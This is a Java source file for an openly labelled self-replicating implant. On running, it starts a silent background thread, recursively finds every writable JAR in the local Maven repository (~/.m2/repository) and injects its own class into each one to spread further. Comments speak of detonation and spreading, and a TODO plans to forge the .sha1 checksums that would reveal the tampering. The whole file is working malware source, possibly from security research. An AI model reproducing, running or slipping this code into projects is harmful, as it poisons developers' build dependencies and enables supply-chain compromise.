package org.example.implants;

import org.example.injector.ClassInjector;
import org.example.injector.ImplantHandler;
import org.example.injector.ImplantHandlerImpl;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.jar.JarFile;

public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * The root directory so search for JARs.
     * All JARs in this directory will be spiked.
     */
    static volatile String CONF_LIMIT_PATH = "~/.m2/repository";

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                SelfRepImplant implant = new SelfRepImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
    public static void main(String[] args) {
        init();
    }

    public static void payload() {
        Set<Path> jarsToImplant;
        try {
            jarsToImplant = findAllJars(CONF_LIMIT_PATH);
        } catch (Exception e) {
            System.out.println("[!] Failed to find JARs.");
            e.printStackTrace();
            return;
        }

        ImplantHandler implantHandler;
        try {
            implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
        } catch (ClassNotFoundException | IOException e) {
            System.out.println("[!] Cannot load oneself. Aborting.");
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        System.out.println("[i] Implant: " + implantHandler.getImplantClassName());
        System.out.println();

        for (Path jarToImplant : jarsToImplant) {
            System.out.println("[+] Infecting " + jarToImplant + "...");
            ClassInjector injector = new ClassInjector(implantHandler);

            try {
                injector.infect(jarToImplant, jarToImplant);
                System.out.println("[+] Spiked " + jarToImplant);
            } catch (IOException e) {
                System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
                e.printStackTrace();
            }

            // TODO Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)

            System.out.println();
        }
    }

    public static Set<Path> findAllJars(String root) throws IllegalArgumentException {
        Path dir = Path.of(root);
        if (!Files.isDirectory(dir)) {
            throw new IllegalArgumentException("Not a directory");
        }

        Set<Path> validJarFiles = new HashSet<>();
        findAllJars(dir, validJarFiles);

        return validJarFiles;
    }

    // Recursive function
    private static void findAllJars(Path dir, Set<Path> accumulator) {
        List<Path> subPaths;
        try {
            subPaths = Files.list(dir).toList();
        } catch (IOException ignored) {
            return;
        }

        List<Path> subDirs = new LinkedList<>();
        for (Path subPath : subPaths) {
            if (Files.isDirectory(subPath)) {
                subDirs.add(subPath);
                continue;
            }

            if (!Files.isRegularFile(subPath)) {
                continue;
            }
            if (!Files.isWritable(subPath)) {
                continue;
            }
            if (!subPath.toString().endsWith(".jar")) {
                continue;
            }
            if (!isJar(subPath)) {
                continue;
            }

            accumulator.add(subPath);
        }

        for (Path subDir : subDirs) {
            findAllJars(subDir, accumulator);
        }
    }

    private static boolean isJar(Path suspectedJarFile) {
        try (JarFile jarFile = new JarFile(suspectedJarFile.toFile())) {
            return jarFile.getManifest() != null;
        } catch (IOException e) {
            return false;
        }
    }
}